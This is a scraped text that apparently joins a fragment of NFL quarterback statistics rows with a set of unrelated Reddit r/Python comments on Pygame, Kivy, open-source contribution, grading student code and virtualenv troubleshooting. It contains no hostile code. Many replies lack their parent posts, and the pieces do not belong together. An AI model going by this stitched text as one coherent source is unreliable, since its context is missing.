60, 6, 30, 105.5 /players/tombrady/profile?id=BRA371156, 6, Tom Brady, NE, QB, 380, 628, 60.5, 39.2, 4,343, 6.9, 271.4, 25, 11, 225, 35.8, 81T, 49, 8, 40, 87.3 /players/andydalton/profile?id=DAL659900, 7, Andy Dalton, CIN, QB, 363, 586, 61.9, 36.6, 4,293, 7.3, 268.3, 33, 20, 204, 34.8, 82T, 56, 15, 29, 88.8 /players/carsonpalmer/profile?id=PAL249055, 8, Carson Palmer, ARI, QB, 362, 572, 63.3, 35.8, 4,274, 7.5, 267.1, 24, 22, 204, 35.7, 91T, 49, 9, 41, 83.9 /players/benroethlisberger/profile?id=ROE750381, 9, Ben Roethlisberger, PIT, QB, 375, 584, 64.2, 36.5, 4,261, 7.3, 266.3, 28, 14, 205, 35.1, 67, 60, 10, 42, 92.0 /players/ryantannehill/profile?id=TAN298716, 10, Ryan Tannehill, MIA, QB, 355, 588, 60.4, 36.8, 3,913, 6.7, 244.6, 24, 17, 204, 34.7, 67, 46, 10, 58, 81.7 /players/joeflacco/profile?id=FLA009602, 11, Joe Flacco, BAL, QB, 362, 614, 59.0, 38.4, 3,912, 6.4, 244.5, 19, 22, 189, 30.8, 74, 45, 14, 48, 73.1 /players/tonyromo/profile?id=ROM787981, 12, Tony Romo, DAL, QB, 342, 535, 63.9, 35.7, 3,828, 7.2, 255.2, 31, 10, 194, 36.3, 82T, 44, 7, 35, 96.7 /players/andrewluck/profile?id=LUC524055, 13, Andrew Luck, IND, QB, 343, 570, 60.2, 35.6, 3,822, 6.7, 238.9, 23, 9, 185, 32.5, 73T, 43, 9, 32, 87.0 /players/elimanning/profile?id=MAN473170, 14, Eli Manning, NYG, QB, 317, 551, 57.5, 34.4, 3,818, 6.9, 238.6, 18, 27, 174, 31.6, 70T, 54, 7, 39, 69.4 /players/camnewton/profile?id=NEW693984, 15, Cam Newton, CAR, QB, 292, 473, 61.7, 29.6, 3,379, 7.1, 211.2, 24, 13, 169, 35.7, 79T, 33, 7, 43, 88.8 /players/russellwilson/profile?id=WIL777781, 16, Russell Wilson, SEA, QB, 257, 407, 63.1, 25.4, 3,357, 8.2, 209.8, 26, 9, 153, 37.6, 80T, 49, 10, 44, 101.2 /players/alexsmith/profile?id=SMI031126, 17, Alex Smith, KC, QB, 308, 508, 60.6, 33.9, 3,313, 6.5, 220.9, 23, 7, 165, 32.5, 71T, 42, 6, 39, 89.1 /players/chadhenne/profile?id=HEN507580, 18, Chad Henne, JAC, QB, 305, 503, 60.6, 33.5, 3,241, 6.4, 216.1, 13, 14, 151, 30.0, 62T, 37, 5, 38, 76.5 /players/robertgriffiniii/profile?id=GRI283140, 19, Robert Griffin III, WAS, QB, 274, 456, 60.1, 35.1, 3,203, 7.0, 246.4, 16, 12, 157, 34.4, 62T, 32, 4, 38, 82.2 /players/colinkaepernick/profile?id=KAE371576, 20, Colin Kaepernick, SF, QB, 243, 416, 58.4, 26.0, 3,197, 7.7, 199.8, 21, 8, 147, 35.3, 64T, 46, 10, 39, 91.6 /players/genosmith/profile?id=SMI269700, 21, Geno Smith, NYJ, QB, 247, 443, 55.8, 27.7, 3,046, 6.9, 190.4, 12, 21, 143, 32.3, 69T, 43, 6, 43, 66.5 /players/nickfoles/profile?id=FOL058566, 22, Nick Foles, PHI, QB, 203, 317, 64.0, 24.4, 2,891, 9.1, 222.4, 27, 2, 129, 40.7, 63T, 52, 13, 28, 119.2 /players/jaycutler/profile?id=CUT288111, 23, Jay Cutler, CHI, QB, 224, 355, 63.1, 32.3, 2,621, 7.4, 238.3, 19, 12, 125, 35.2, 67, 32, 8, 19, 89.2 /players/mikeglennon/profile?id=GLE711694, 24, Mike Glennon, TB, QB, 247, 416, 59.4, 32.0, 2,608, 6.3, 200.6, 19, 9, 126, 30.3, 85T, 28, 7, 40, 83.9 /players/aaronrodgers/profile?id=ROD339293, 25, Aaron Rodgers, GB, QB, 193, 290, 66.6, 32.2, 2,536, 8.7, 281.8, 17, 6, 108, 37.2, 83T, 35, 7, 21, 104.9 /players/ryanfitzpatrick/profile?id=FIT792915, 26, Ryan Fitzpatrick, TEN, QB, 217, 350, 62.0, 31.8, 2,454, 7.0, 223.1, 14, 12, 116, 33.1, 77T, 32, 7, 21, 82.0 /players/mattschaub/profile?id=SCH085186, 27, Matt Schaub, HOU, QB, 219, 358, 61.2, 35.8, 2,310, 6.5, 231.0, 10, 14, 115, 32.1, 46, 26, 3, 21, 73.0 /players/jasoncampbell/profile?id=CAM375235, 28, Jason Campbell, CLE, QB, 180, 317, 56.8, 35.2, 2,015, 6.4, 223.9, 11, 8, 86, 27.1, 80T, 25, 7, 16, 76.9 /players/ejmanuel/profile?id=MAN738705, 29, EJ Manuel, BUF, QB, 180, 306, 58.8, 30.6, 1,972, 6.4, 197.2, 11, 9, 86, 28.1, 45, 28, 4, 28, 77.7 /players/joshmccown/profile?id=MCC600777, 30, Josh McCown, CHI, QB, 149, 224, 66.5, 28.0, 1,829, 8.2, 228.6, 13, 1, 90, 40.2, 80T, 21, 3, 11, 109.0 /players/mattcassel/profile?id=CAS541133, 31, Matt Cassel, MIN, QB, 153, 254, 60.2, 28.2, 1,807, 7.1, 200.8, 11, 9, 80, 31.5, 79T, 26, 5, 16, 81.6 /players/terrellepryor/profile?id=PRY474541, 32, Terrelle Pryor, OAK, QB, 156, 272, 57.4, 24.7, 1,798, 6.6, 163.5, 7, 11, 85, 31.3, 73T, 16, 4, 31, 69.1 /players/casekeenum/profile?id=KEE690598, 33, Case Keenum, HOU, QB, 137, 253, 54.2, 31.6, 1,760, 7.0, 220.0, 9, 6, 76, 30.0, 66, 26, 6, 19, 78.2 /players/brandonweeden/profile?id=WEE221487, 34, Brandon Weeden, CLE, QB, 141, 267, 52.8, 33.4, 1,731, 6.5, 216.4, 9, 9, 80, 30.0, 95T, 21, 6, 27, 70.3 /players/sambradford/profile?id=BRA101548, 35, Sam Bradford, STL, QB, 159, 262, 60.7, 37.4, 1,687, 6.4, 241.0, 14, 4, 85, 32.4, 73, 19, 3, 15, 90.9 /players/kellenclemens/profile?id=CLE075538, 36, Kellen Clemens, STL, QB, 142, 242, 58.7, 24.2, 1,673, 6.9, 167.3, 8, 7, 80, 33.1, 81T, 22, 2, 21, 78.8 /players/christianponder/profile?id=PON404041, 37, Christian Ponder, MIN, QB, 152, 239, 63.6, 26.6, 1,648, 6.9, 183.1, 7, 9, 83, 34.7, 47, 26, 2, 27, 77.9 /players/mattmcgloin/profile?id=MCG491502, 38, Matt McGloin, OAK, QB, 118, 211, 55.9, 30.1, 1,547, 7.3, 221.0, 8, 8, 69, 32.7, 52, 29, 4, 6, 76.1 /players/jakelocker/profile?id=LOC066933, 39, Jake Locker, TEN, QB, 111, 183, 60.7, 26.1, 1,256, 6.9, 179.4, 8, 4, 56, 30.6, 66T, 16, 3, 16, 86.7 /players/michaelvick/profile?id=VIC311467, 40, Michael Vick, PHI, QB, 77, 141, 54.6, 20.1, 1,215, 8.6, 173.6, 5, 3, 51, 36.2, 70, 25, 5, 15, 86.5 /players/mattflynn/profile?id=FLY487098, 41, Matt Flynn, GB, QB, 102, 166, 61.4, 33.2, 1,146, 6.9, 229.2, 7, 4, 57, 34.3, 56, 17, 2, 17, 86.1 /players/thadlewis/profile?id=LEW733214, 42, Thad Lewis, BUF, QB, 93, 157, 59.2, 26.2, 1,092, 7.0, 182.0, 4, 3, 48, 30.6, 57, 15, 4, 18, 81.0 /players/kirkcousins/profile?id=COU709400, 43, Kirk Cousins, WAS, QB, 81, 155, 52.3, 31.0, 854, 5.5, 170.8, 4, 7, 41, 26.5, 62, 7, 2, 5, 58.4 /players/scotttolzien/profile?id=TOL825549, 44, Scott Tolzien, GB, QB, 55, 90, 61.1, 30.0, 717, 8.0, 239.0, 1, 5, 29, 32.2, 52, 13, 2, 3, 66.8 /players/brianhoyer/profile?id=HOY440791, 45, Brian Hoyer, CLE, QB, 57, 96, 59.4, 32.0, 615, 6.4, 205.0, 5, 3, 33, 34.4, 47T, 6, 1, 6, 82.6 /players/blainegabbert/profile?id=GAB221145, 46, Blaine Gabbert, JAC, QB, 42, 86, 48.8, 28.7, 481, 5.6, 160.3, 1, 7, 23, 26.7, 67T, 6, 1, 12, 36.0 /players/kyleorton/profile?id=ORT716150, 47, Kyle Orton, DAL, QB, 33, 51, 64.7, 17.0, 398, 7.8, 132.7, 2, 2, 19, 37.3, 39, 4, 0, 0, 85.3 /players/jefftuel/profile?id=TUE385627, 48, Jeff Tuel, BUF, QB, 26, 59, 44.1, 29.5, 309, 5.2, 154.5, 1, 3, 15, 25.4, 59T, 3, 1, 2, 45.1 /players/mattbarkley/profile?id=BAR192558, 49, Matt Barkley, PHI, QB, 30, 49, 61.2, 16.3, 300, 6.1, 100.0, 0, 4, 17, 34.7, 26, 3, 0, 3, 44.6 /players/chasedaniel/profile?id=DAN230354, 50, Chase Daniel, KC, QB, 25, 38, 65.8, 7.6, 248, 6.5, 49.6, 1, 1, 14, 36.8, 48, 3, 1, 2, 81.9
I used [Making Games with Python &amp; Pygame](http://inventwithpython.com/) and it seemed OK for the basics.
If you already know how to code, don't use tutorials. Use the docs and the source code. Source might not be a good idea with C++ (love2d is C++ right? I heard that somewhere before but never used it), but in Python I find that reading the source helps me two times. On one side it's more specific than any documentation can be, because you can see what really happens. On the other hand if you read the source code in your libs/virtualenv you can also add debugging messages to the framework to understand it even better. When something is not working as expected you might even find that it's a bug in the framework not in your code, then you can go and fix it in the framework instead (yeah, open source!). Life is good on Planet Python. :)
Hey, you should check out pysoundcard - it's the successor to pyaudio and built on CFFI it works better with PIP and Pypy too. I've been doing some audio / graphics work with python and doing it in a responsive way can be tricky. Here are some I made in shoebot a while ago.. https://github.com/stuaxo/shoebot-audiovis A lot of the more interesting GUI / Audio stuff doesn't work super well with pip and virtualenv - so I'm working on this Vispy looks interesting, as does iVisual (VPython in IPython). https://github.com/stuaxo/vext To solve that problem. I'd try submitting anything you get working on /r/python - they are much more friendly to working code, I think they are quite burned out from a lot of homework style questions (I don't think yours comes under this heading).
While I do this myself too, I often end up regretting it because of subtle shell bugs that are easy to introduce, hard to see and very confusing when triggered. It's usually pleasingly concise and very often good enough, though.
Yeah-yeah, we're working on it, really sorry!
I am probably going to be downvoted to the furthest reaches of hell for this comment. But I've messed with pygame before and I found it to be extremely buggy. I remember it took me hours to just get it installed. Unless they recently fixed the 64 bit package, I remember it just being absolutely unusable and just existed for show. I don't want to discourage you from pursuing that which piques your interest, so good luck and on the bright side if you can actually make an amazing game out of it you will be instantly considered a top tiered programmer.
Check out Steve Lott's book, "[Python for Secret Agents](http://www.amazon.com/Python-Secret-Agents-Steven-Lott/dp/1783980427/ref=tmm_pap_title_0)".
PyGame is a great way to get to grips with game making concepts (loops, rendering, etc), but a terrible way to produce functioning games for distribution, imo.
i couldn't reproduce the issue with python 2.7.9. can you reproduce it from the interactive interpreter using the example you have given? speaking of example: please use the "formatting help" when your post does not look like intended. adding four spaces before your code would make it much better readable.
No, most of my code is not speed-critical, which is why I use Python most of the time for general purpose programming. I think you misunderstood what I said: In the context of general-purpose programming, the prevalent reason for avoiding python, if one were to do so, would be that Python's execution speed doesn't meet the needs of the application.
&gt; (love2d is C++ right? I heard that somewhere before but never used it) Lua.: https://love2d.org/ 
"Kindly solve my issue" == [Please do my homework?](http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/)
&gt; I'd try to get the diff using timedela That's what he does. `date - date` returns a timedelta: &gt;&gt;&gt; type(dt_dateb - dt_datea) &lt;type 'datetime.timedelta'&gt; 
&gt; but simply forking does not copy any memory on any system with virtual memory support (i.e, everything except embedded devices). \* on any UNIX system. Windows doesn't support copy-on-write shared memory at all. 
Following on from my comment above. The lazyfoo tutorials get you up and running real quick with pysdl2 (pysdl2-cffi)
poster is a redditor for 2 hours. he likely knows the rules and ignores them
Not tutorials, but, courtesy of /u/Mekire, [this repo](https://github.com/Mekire/meks-pygame-samples) has a bunch of examples and [this one]( https://github.com/Mekire/pygame-mutiscene-template-with-movie) is a good template for organizing a pygame project.
Yeah, you program in Lua, but the framework is implemented in C++. \^_^
&gt; lazyfoo tutorials what is that? 
&gt; Explicit is better than implicit. &gt; … &gt; Simple is better than complex. &gt; … &gt; Flat is better than nested. Also, most editors have a search-and-replace functionality for things like `"input" -&gt; "inputs"`. But arguing over that is pretty stupid anyway, because the whole approach is unpythonic.
Always good to see apps based on web2py. Keep up the hard work :-)
I think we're going to have to agree to disagree on whether "flat is better than nested" is applicable when you turn 40 lines into 3, and whether 40 lines of code is simpler than 3 lines of code.
For the most part people are here because they are interested in writing their own Python, so unless you really good (in which case you should get a job) you will probably be doing homework for people who don't know how to send bitcoin. Let me pitch you a better solution, join an open source project and hone your skills then collect the money when you graduate and are already ready for a programming job. Probably will work better then the old ("Learn Python" + "???" = "profit") equation.
IMHO, if your bash script is big enough that subtle bugs are easy to introduce, then it no longer falls under the "simple bash script". 
I wrote a couple free books. They're for beginners, but you can just look at the source code for the games and learn from that directly. It's fairly straightforward for experienced devs: This chapter in particular covers the basics: http://inventwithpython.com/pygame/chapter2.html
Pygame is old and dying. Look at its releases. Last updated in 2009. I'd take a look at Kivy which is coming along nicely and will have Python3 support.
I like it! Looks like maybe a detective style game?
Agreed; I picked up some great fundamentals on game loops, blitting rectangles, and game object types, but when it came time to bundle and share my games, it was always a headache. Strongly recommended for picking up gamedev fundamentals!
Perhaps [cherrypy](http://docs.cherrypy.org/en/latest/deploy.html#ssl-support) ?
This doesn't really belong here. Look rather for some other game design subreddit.
I can appreciate this comment. I am a data scientist, and I have always wanted to join an open source project and contribute but I dont know any. Do you have any tips on how to join one?
Jump right in the issue tracker and find something that interests you to work on. Most people in the open source community don't bite and will be glad to help a first time contributor get on his feet. :)
I don't think explicit access modifiers actually help at all in preventing content coupling. The reason why it was added to languages such as Java has, I think, more to do with dogma and condescension than a fair assessment of its practical use. Never seen any bugs caused by this 'loose' policy of python's either. I have printed a few _private_variables out for inspection during some debug sessions, though. Which is useful.
In a way, it was a missing dependency, since mod_wsgi was compiled for 2.7, not 3.x. I've added the solution to the end of my original post for future reference. 
What about using GitHub? You would have a repository in which you have written your tests, and then the students would fork that and submit pull requests. You could then have your GitHub repository linked to Travis-CI which would automatically run the tests on pull request and tell both you and the student if the tests failed or passed. You can check out [GitHub Education](https://education.github.com/) and the [GitHub Education Classroom Guide](https://education.github.com/guide).
2nd that
It's not a bunch of hard-coded numbers, it's basically a bunch of data involving orders from certain dates and what type of orders they are etc etc. All of the info is formatted as "Date/Order Type/Order Code/Order Function" etc etc with each slash being a separate column. Because everything is text based I didn't think I'd be able to use that module.
Hopefully, you will be able to find such a tool. In the absence of such a tool, here's how I would do it: I would write stub files that include doctests so that they could run them locally and see if they pass the tests. I would write a separate testing file, that includes supplementary tests, nothing sneaky, just a few additional tests to catch those that would hard-code solutions. This supplementary testing file would simply import the student's submitted file and run it. However, prior to doing so, when students submit their assignments (which they would be allowed to do once!), I would quickly scan them visually (to ensure nothing bad is included and to spot unusual - possibly not very "efficient" solutions) and run them once using the external test; if some tests fail because they hard-coded answers, I would give them zero on that assignment. I can guarantee you that students would learn quickly not to do so. Note that doctest allows to write tests in a .txt file and import them. You would actually provide one file to the students and use a different one (with the same name) for your own tests. I believe that it is important to actually look at some sample code submitted by students to give them feedback. Finally, you might be interested (as an introduction) to use http://reeborg.ca It includes a tutorial, and you can define your own tests which the student can run and they can submit their program as a url ... If you have questions about Reeborg's world, feel free to email me. 
On the feedback, absolutely. I wouldn't want to autograde everything because it is important to give feedback. (Especially near the time of creation.) *"I see what you're doing and where you're going, but that huge nested if statement might be less work if you..."* *"You're making a lot of work for yourself. Check out ____, I think that might get you going in the right direction..."* Checking out reeborg. Thanks.
It handles text just fine, my point was that you're not using a bunch of crazy dynamic VLOOKUPs or whatever. 
As you can tell I'm very new to this whole excel/python integration so pardon my ignorance. Do you have a link where I can read up on the module? 
You can usually just open their website and they will have some links like “Contribute,” then from there you will find all the information, including what tools they use. For example, open https://www.videolan.org/ and in the navigation bar there is a “Contribute” item. Good starting points are bug trackers, mailing lists and IRC channels.
Who is they? Which website, are you saying VLCs website will have an open source contribution area?
Over here, we've used this thing called [Coursemology](http://coursemology.org/). It's an assignment(mission) based system that seems to handle what you need. Automated grading with manual review, multiple independent assignments and an XP based system that (for me) helped out a bit.
Exactly this. I use GitHub + Travis with my students. Assignments can be a GitHub repo and "answers" are pull-requests. The students can check their work gainst the CI in their own forks before submitting PRs. PRs which do not past CI muster can be used fairly well as an initial prune. As an added bonus, it teaches the students how to a) submit changes to FOSS projects and b) about branching/CI/discussing changesets/etc which they'll come across in the Real World (TM).
I'm not aware of such a tool. However, I wonder if you could bend ipython notebooks to serve your purpose? If you didn't want to use a public notebook viewer, you could host your own (for security reasons you should follow the FAQ and use something like a docker container http://nbviewer.ipython.org/faq ). 
I've used BitBucket, and an automated Python script to update with the whole class. Using DVCS is a pain with new students at first, but it works fine after getting set up. 
I was talking about open-source projects generally. Not only the VLC website has a page for contributors, many open-source projects have. Some projects do not have a site like that though, but often they have a link to a source code repository (Git, Mercurial/hg, Subversion, CVS) and a mailing list or only a Github repository (which has a bug tracker built-in) or some other way to see the code and to send back changes to the code. Just open up some website of an open-source project and search for source code repositories, mailing lists, chat rooms, or bug trackers. You will surely find something. **Edit**: If you don’t know what to do in the code, you can look into their bugtracker and look for bugs that you can fix or features you can add.
I think you will need to put the call to `twitter.search` inside a `try` block to keep this running for any extended period of time.
I think the main unPythonic mistake you're making is getting hung up on giving the variable name of the objects the same name as the IO pins. I don't think there is any need to name them at all, if you use a dict. That's the point of a dict. This is not right thinkin': input_dict = {'1.00': self.input_1_00 = object()} Instead: input_dict = {'1.00': led_light_object()} (here I am using "led_light_object" as shorthand for whatever GUI thingie you use to light up on your GUI). See, it has no name. But who cares? You'll access it via its dict key anyway...so if you want the led_light_object that goes with pin #1.00, you just use: input_dict['1.00'].TurnOnTheLightOrWhatever() Of course, to turn them on you would really do this in a loop with the number as a variable, something like: for pin_code in list_of_pin_codes: input_dict[pin_code].TurnOnTheLightOrWhatever() Now you have turned them on and you never even needed to know their names. Now the final part is knowing *which* to turn on, based on that 101000011 string thing you get back from the machine. So then you need a mapping between that and the dict. If you have two lists, one as a string (the 10010110 string) and the other as a Python list of pins, you could turn the string into a Python list, then .zip() the two lists together and wind up with a list like: [('1.00', 0), ('1.10',1), ('1.20', 0), etc...] Now you can just loop through that list, use x[0] to get the pin you need, use x[1] to get the value of that pin, and now you have all the information you'll need to light the pins appropriately. Does this make sense? 
This, sadly, is the conclusion I've come to as well. Now the question is, should I use kivy alone, or should I work with KivEnt, the new, Entity based game engine? KivEnt is still a bit bleeding edge for my taste, but it really seems interesting.
You can checkout www.codingbat.com. It has "**Teacher Features**" whereby you can create your assignments, along with test cases, and students submit from their accounts. See "Teacher Features" section at http://codingbat.com/help.html for more info. I hope this helps.
This is what I would suggest too, not just because it solves the problem well but also because knowing revision management is a valuable and useful skill. I wish I had learned it years earlier.
By 12.04 ... I'm assuming you are using Ubuntu 12.04? Just saying ... because people who don't use Ubuntu may not know. [I should note that since 14.04 is out ... it may not hurt to do a reinstall or an upgrade to 14.04. You should probably do that within a year anyway. Besides, having newer default python and package versions helps to avoid lots of virtualenv complexity.] By 2.73 ... I'm assuming python --version is outputing "Python 2.7.3". If so, I believe that this is the default version of python for 12.04 ... so you're good there. What you may have done, however, is you may have installed incompatible versions of various python **modules/packages** over the top of the existing base. You could read up on apt to help you figure out and resolve those issues. Ubuntu forums could help but it might be as easy as: 1. Use: dpkg --get-selections To get a list of installed packages. 2. I'm not 100% sure ... but most python packages in Ubuntu use "python" or "python3" (for python3) as the first characters of the package: e.g. python-mutagen as the title. Thus dpkg --get-selections | grep python Will get a list of installed python modules. 3. Use apt-get and do a forced reinstall of all of those modules. Further help might be found on Ubuntuforums, etc. 
The main part is choosing the correct structure and parts for multithreading. You always want to minimize the communication between each running nodes. Take a look here: [ParallelProcessing](https://wiki.python.org/moin/ParallelProcessing) 
1. Pick a project you like e.g. http://scikit-learn.org in your area of expertise with a language you know or want to discover 1. Pick a bug that you can handle in the tracker https://github.com/scikit-learn/scikit-learn/issues and claim it if you are confident you can solve it 1. Go through and understand the official repository https://github.com/scikit-learn/scikit-learn 1. Learn the contribution rules of the projects https://github.com/scikit-learn/scikit-learn Contributing with details https://github.com/scikit-learn/scikit-learn/blob/master/CONTRIBUTING.md and guidelines http://scikit-learn.org/stable/developers/index.html 1. Be available on IRC or which ever channel developers use here the mailing list scikit-learn-general@lists.sourceforge.net and IRC: #scikit-learn @ freenode 1. Submit a small clear detailed patch 1. Once it gets approved submit increasingly large relevant patches (back to 2) while at first having the smallest impact you can, always making it easy for the reviewers to integrate your work
Just as easily as they could copy the answers any other way :) 
Yes sorry didn't say Ubuntu. Actually it's "elementary OS" which is based on 12.04, the same for low-level stuff like this. Their 14.04 based "Freya" is still in beta, stable release likely many months away. And yes 2.7.3 is the stock system Python for this OS. Ans I've done a full apt-get install --reinstall of all the python stuff from the repos, very long list but I'm pretty sure nothing at the system level is running anything to do with Python 3. And so far all my add-on stuff is also v2. My use of virtualenv is where I'm a noob, sometimes for example I've created the venv and run from ./venv/bin but forgot to set up auto-activation so things "bleed" over to the system locations. OK I'll start posting some of my system details separately
You should look at schools in your state to see if APCS credit is accepted. If so, it'd be advantageous to your students to still offer APCS. My high school did and it prepared me so well for college. It covered the content of the first year of college CS courses and made the transition for me easier. What you could look into is offering more than one course. You could do an intro CS course in Python and then APCS as what people take their second year. My school did something like this. The first year of programming classes was learning the basics of programming in C++. It covered all the basics like loops, etc. and we started object oriented programming near the end of the year. The next year we could focus on new content in Java that wasn't as basic as how to do for loops since we learned that in C. I feel like my high school's CS curriculum was amazing, so it might be helpful to your students.
&gt; I am a data scientist Do you use any open source python projects to do that? Find their documentation, find a place where its woeful (there will be), find out how to add to it, and send a PR. Then take it from there. Also just helping to triage an issue tracker. Maintainers love that shit.
~$ echo $PATH /home/user/bin:/home/user/.pyenv/shims:/home/user/.pyenv/bin:/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ~$ ls /home/user/bin change_tz easy_install ics_diff khard runadmin.py screenfetch davcontroller easy_install-2.7 quicktile.py runshell.py ~$ which python /home/user/.pyenv/shims/python ~$ python --version Python 2.7.3 ~$ which pip /home/user/.pyenv/shims/pip ~$ pip --version pip 1.5.6 from /usr/local/lib/python2.7/dist-packages/pip-1.5.6-py2.7.egg (python 2.7) 
http://www.reddit.com/r/Jobs4bitcoins
https://github.com/alexandre/itertools-examples
I don't think it's actually my system env that's borked, just my half-correct usage of virtualenv, maybe path issues? so the app is looking for libs in the wrong places? 
This isn't a great subreddit to post this because most of the people here are Python developers or people learning Python.
I've not heard of that one. I'll have to take a closer look. I found Kivy while looking for replacements for PyGame.
You my boy, blue
I've always found it easiest to get involved in an open source project when I'm using it and I hit some bug or limitation - that gives me the motivation to work out how to fix it, and how to get my fix included. If you've got a useful contribution, most communities will be happy to guide you with getting it included. So if you're building applications, use open source libraries like scikit learn, pandas, any of the array of Python plotting libraries now available, or whatever makes sense for the problem you're solving. Sooner or later you'll need something that they can't quite do, or you'll find it goes wrong in some circumstance, or the docs won't make it clear enough how to achieve what you want. You can also do what /u/utopiah suggests - pick a project and try to find a bug you can fix. Lots of projects try to maintain a list of 'easy' (aka quickfix, bitesize) bugs that are suitable for new contributors - [here they are for scikit learn](https://github.com/scikit-learn/scikit-learn/issues?q=is%3Aopen+is%3Aissue+label%3AEasy). But I don't find that as fun or interesting as fixing things that affect me.
I'm not sure why I would want this technique. Maybe add some explanation of what problem you're trying to solve?
I agree it's a good place to start learning how to create a larger Flask app. Just glancing at the requirements.txt file and the app structure seems you are demonstrating many good practices. I'll fork it later and take a closer look. One point not related to a technical issue. The name 'yapper' seems more like a chat app than a blog. ;) 
name is not fixed. earlier it was just flask-blog
Yes the jokes really ruin it for me.
My friend and colleague created the [Python Koans](https://github.com/gregmalcolm/python_koans). It sounds like it's exactly what you are looking for. A bunch of red tests (failing tests) that you have to implement learning python along the way. I can't recommend it enough.
Never is a strong word. Yes, it's generally a bad idea, but if you already downloaded the package via git, the security concerns are somewhat moot, aren't they(meaning that you already trust the maintainer)?
I think you are right, especially considering MITM attacks and the like. I redacted the part. Anything else to add?
Its less about security and rather more about dependency conflicts. This is because of the change of version incompatibilities between imperfectly specified requirements across any package you have installed system wide. For example, package A requires libraries C,D,E == version K, and package B requires libraries D,E &gt; version U,G. What version will E be? and will E work with A? that depends on the API stability promises of E. All software is basically terrible, you should keep it far away. Don't depend on API version compatibility from random library authors on pypi. Virtual environments exist for this reason, they keep dependencies from different packages separate, and remove dependency conflicts between incompatible packages. Teaching people to sudo pip install instills a bad habit in them. Lets prevent them from hurting themselves. 
I use windows and OS X
I have a hard time believing 9-year old kids will understand any of that, however "childishly" explained, but maybe I underestimate them.
I'd seriously vote for github. Git is a graph database, and is a requisite for being a developer at a lot of places. Learning git changes how you think about building your code base and how you iterate through changes. This is good for any language. You can chose a number of workflows that could meet your classes needs. Right now what comes to mind is the forking workflow, where each student would commit to the branches and master of a fork from your primary repo. That way you could easily distinguish the differences between your student's code, as well as still manage the overall structure of the project. As far as automatic testing with python goes, you could look into having something like jenkins run a container of the students build, run the python nosetests and fail if the unit tests fail. CI isn't a trivial task though.
Kivy doesn't depend on pygame at all (as you note), though it has been our default backend for most things on most platforms. However, we've now moved away from it and I think the next release will use sdl2 by default on almost every supported platform. This actually does resolve some long standing problems arising from pygame, and should help to unify some of our internals across different platforms since we can now rely on sdl2 for input etc on both desktop and mobile, rather than augmenting it as much as we do pygame.
I would recommend starting with Kivy and seeing how it goes. If nothing else, spending some time learning to use the graphics api etc will not be wasted even if you use KivEnt later, but it's probably harder to pick this stuff up if you jump straight to KivEnt whose documentation is still under development.
Python doesn't do UIs terribly well on its own (it uses Tkinter, which is a bit limited and outdated, but works). However, there are a number of excellent wrappers around existing GUI toolkits for doing full fledged UI development in python. See PyQt for example. Web applications are really well covered - everything from web servers to databases to simple scripts are well developed for pretty much every application. You'd have to be more specific. Command line "executables" are a common use case. More than a replacement for bash or batch files. Note that they usually require an interpreter to be installed on the system to run the code. Many system administration tasks for linux distros are done using python. Mobile applications are still an 'in-progress' domain. The best example might be Kivy, which is usable, but still young. For android, you can use python as one of the languages with SL4A. Not sure about the state of IOS or other platforms. Other: It has a really good niche in scientific or numerical computing - basically as a MATLAB or R equivalent. See numpy/scipy/pandas. Python has become a de facto language for use in GIS - from QGIS to ArcGIS, it's everywhere. It's also quite often used to control other elements in programs, such as integration with Excel, or gaming engines (as scripting engine). Lastly, in my experiences, it's quite common to use python helper programs in other elements of programming. Example off the top of my head: Libxcb (C bindings to the X protocol in unix) doesn't actually have any C source files. Instead it is generated automatically using xml definitions, and a python program which converts them into C. There are many others - but basically, for any domain, python is already there.
Any ways you think I could improve the project? Here's what I was going for: One of my objectives with the project was to present the concept in a way that anyone without any notion of programming, string regex-splitting, the "bag of words" concept, frequency distributions, random variables, conditional probability, variable-reduction, etc. can at the very least say, "Oh, I guess that kinda makes sense." Edit: I guess I should also say that I tried to use the bare minimum necessary to emulate "autocompletion" so if someone wanted to replicate, modify, whatever, or hopefully *pickup* programming, then even better :)
&gt; Submit a small clear detailed patch After claiming responsibility for the task possibly that you made. Nobody wants you to do waste your time doing work that someone else is planning on doing &gt; Once it gets approved submit increasingly large relevant patches (back to 2) No!!! I run an open source project. Small commits focused on small tasks are much easier to review. If someone changes the entire code base, even if it's a good small change, the patch will get rejected.
Im having trouble finding a page with all of the players id's. Do you know where I could look? 
Recent versions of python should automatically include pip. 2.7.9+ and 3.4.0+.
That's a sound point. I'll look around myself for some tutorials, so don't feel compelled to answer, but do you happen to have any advice on where/how to get started with kivy?
In any environment, there are several places that Python will try to import modules from. You can see these inside Python by examining `sys.path`. When you're not in a virtualenv, that will include your per user packages in `~/.local/lib/python2.7/site-packages`, systemwide pip installed stuff in `/usr/local/lib/python2.7/dist-package` and apt installed stuff in `/usr/local/lib/python2.7/dist-package`. &gt; I would have thought the dpkg/apt environment would be the canonical "system installed" location, so why would it givr priority to /usr/local/ ? It assumes you know what you're doing, so if you install something that conflicts with something on the system, it treats that as you deliberately overriding the system library. &gt; And finally, what is the mechanism for this "preference"? Just the path? `$PATH` (the environment variable) determines where it looks for commands you type in the shell. `sys.path` in Python is where it looks when finding packages to import. &gt; Does my path look OK? At a glance, yes.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
The X protocol is just a communications protocol. Draw pixel at x,y. Etc. Various libraries implement this protocol, such as Xlib and libxcb. Xlib is written the old fashioned way, manually, in C. Xcb consists of a bunch of XML files that define the protocol and a python script that takes those files and generates a C library based on them. Basically, when the protocol files change, the C library does not need to be modified... Just rerun the python script and compile the resulting code.
https://open.kattis.com/ is a system used by some universities, originally made by KHT in Sweden I believe. You submit code, it runs with a set of inputs and checks outputs, then gives pass/fail grades. Not sure if they allow just anyone to submit problems though.
I wrote [this typing game](https://github.com/raviqqe/typetod) which works on terminals and reads stdin as sample text. I assumes that the process whose stdin is connected stdout of the typing game may write something to it late or little by little. So, it has to be able to read stdin in real time even after curses module is started and its window is written to the screen. I googled a lot about some sort of ways to do this, but couldn't find any solution using only Python. Then, I translated a good one written in C into it.
